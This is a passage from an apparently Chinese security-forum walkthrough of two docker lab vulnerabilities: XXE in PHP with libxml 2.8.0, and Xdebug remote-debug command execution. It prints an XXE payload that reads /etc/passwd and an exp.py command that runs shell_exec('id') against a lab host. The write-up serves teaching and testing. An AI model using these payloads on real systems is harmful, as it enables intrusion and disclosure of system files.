其次用 xml 将其和某个网址页面进行拼接（拼接的主要原因是 xml 值存储数据不一定会输出因此需要将数据外带）；  
拼接完成后访问页面就可以启动后端代码，然后后端代码将数据存储在指定文件内；  
最后直接访问该文件获取传送出的数据。

进入php\_xxe的docker环境

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bcb5983892e38daf48b66c7d5992239ccf330409.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bcb5983892e38daf48b66c7d5992239ccf330409.png)

首先访问8080端口全局搜索`libxml`，版本为2.8.0，这个版本是默认支持并开启对外部实体的引用的

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f8ad9dc3330d6dd7eaab7f453cecb54fb53e9a35.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f8ad9dc3330d6dd7eaab7f453cecb54fb53e9a35.png)

在当前页面用bp抓包

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-414a7a9c8be074203a2e0591dd9483b48842c264.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-414a7a9c8be074203a2e0591dd9483b48842c264.png)

这里使用`file://`来获取passwd

```php
<?xml version="1.0" encoding="utf-8"?>         <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>    <test>  <name>&xxe;</name>                  </test>
```

改GET为POST再加入代码发包即可得到passwd

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-466670aa2326806586266e13e6fb3171f44d5521.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-466670aa2326806586266e13e6fb3171f44d5521.png)

xdebug-rce
==========

xdebug本身就是一个调试程序，对get参数或者cookie的执行参数进行验证，如果验证通过就会进行调试，这里因为没有指定远端主机，所以任意主机都可以对php进行调试，即执行命令。

进入xdebug-rce的docker环境

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-347bda95eafe3adc7d68ab42de6c195242fa6ec1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-347bda95eafe3adc7d68ab42de6c195242fa6ec1.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-34f2c5dce329d98000cf8d52affbaba0f3eb4ddb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-34f2c5dce329d98000cf8d52affbaba0f3eb4ddb.png)

访问8080端口全局查找`xdebug.remote`，发现允许远程调试

```php
xdebug.remote_enable //允许远程，为On或者1都表示启用，Off和0表示关闭关闭xdebug.remote_host = 127.0.0.1 //远程主机的IP在这里填写，固定的 127.0.0.1
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-774bd54cef4b2e705e8b053057613465ff223ef7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-774bd54cef4b2e705e8b053057613465ff223ef7.png)

进入`xdebug-rce`目录下是用exp.py输出id

```php
python3 exp.py -t http://192.168.1.10:8080/index.php -c "shell_exec('id');"
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a8d21909f8f8927b0250af2c34fef8f04c3c96b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a8d21909f8f8927b0250af2c34fef8f04c3c96b.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-652b05d41cb423a3d9e93b9943cf17a008a3e0c9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-652b05d41cb423a3d9e93b9943cf17a008a3e0c9.png)